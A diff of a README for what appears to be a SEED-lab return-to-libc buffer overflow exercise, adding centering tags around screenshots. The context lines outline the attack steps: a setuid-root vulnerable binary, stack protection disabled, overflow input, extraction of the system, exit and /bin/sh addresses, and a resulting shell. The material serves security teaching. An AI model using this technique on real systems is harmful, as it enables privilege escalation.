@@ -20,15 +20,19 @@ $ export MYSHELL="/bin/sh"
 -	$ chmod 4755 vul
 -	$ gdb ./vul
 
+<p align="center">
 <img align="center" src="/Images/1.png" width=400 height=400>
-
+/p>
  
 4. Overflowing the Buffer with all ‘A’ to check ending limit of Return Address(EIP)</br>
 **Command:** 
 -	$ (python -c 'print "A"*27')> badfile
 -	$ gcc -g -fno-stack-protector -m32 vul.c -o vul
 -	$ gdb ./vul
+
+<p align="center">
 <img align="center" src="/Images/2.png" width=400 height=400>
+</p>
 
 5. Extract 'system' & 'exit' addresses by compiling and running the vul.c file once</br>
 **Command:**
@@ -47,8 +51,10 @@ $ export MYSHELL="/bin/sh"
 --> Starting program: /home/seed/exp  
     bffffe8f  
     [Inferior 1 (process 4738) exited normally] 
-
+    
+<p align="center">
 <img align="center" src="/Images/3.png" width=400 height=400>
+</p>
 
 7. Now perform the attack by using a python script and concatenation addresses for 'system', 'exit'& '/bin/sh'</br>
 **Command:**
@@ -59,9 +65,11 @@ $ export MYSHELL="/bin/sh"
 
 --> Starting program: /home/seed/vul 
 Read from file: AAAAAAAAAAAAAAAAAAAAAAA0�巰/巏���  
-$
+$  
+<p align="center">
 <img align="center" src="/Images/4.png" width=400 height=400>
 <img align="center" src="/Images/5.png" width=400 height=400>
+</p>
 
 8. Now, in order to execute the attack even when the kernel is generating random addresses, use following commands along with commands from steps 1-7</br>
 **Commands:**
